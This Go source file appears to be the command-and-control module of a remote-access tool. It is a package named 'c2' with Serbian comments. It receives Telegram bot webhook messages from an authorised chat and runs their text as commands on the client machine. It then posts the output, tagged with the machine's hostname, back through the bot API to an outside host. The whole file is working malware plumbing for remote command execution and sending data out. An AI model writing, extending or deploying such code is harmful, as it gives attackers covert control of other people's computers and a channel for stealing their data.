package c2

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"royal/config"
	"royal/internal/commands"
)

func HandleWebhook(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Println("Greška pri čitanju Webhook zahteva:", err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	var update struct {
		Message struct {
			Text string `json:"text"`
			Chat struct {
				ID int `json:"id"`
			} `json:"chat"`
		} `json:"message"`
	}

	if err := json.Unmarshal(body, &update); err != nil {
		log.Println("Greška pri parsiranju JSON-a:", err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	cfg := config.LoadConfig()
	if fmt.Sprintf("%d", update.Message.Chat.ID) != cfg.ChatID {
		log.Println("Ignorišem poruku iz nepoznate grupe.")
		return
	}

	log.Println("Primljena komanda:", update.Message.Text)
	output := commands.ExecuteCommand(update.Message.Text)
	SendMessage(output)
}

// SendMessage šalje poruku sa identifikacijom klijenta
func SendMessage(message string) error {
	cfg := config.LoadConfig()   // Učitava token i chat ID iz .env
	hostname, _ := os.Hostname() // Dohvati ime računara klijenta

	data := map[string]string{
		"chat_id": cfg.ChatID,
		"text":    fmt.Sprintf("[%s] %s", hostname, message), // Dodaj hostname uz poruku
	}

	jsonData, _ := json.Marshal(data)

	resp, err := http.Post(cfg.APIURL+"/sendMessage", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}
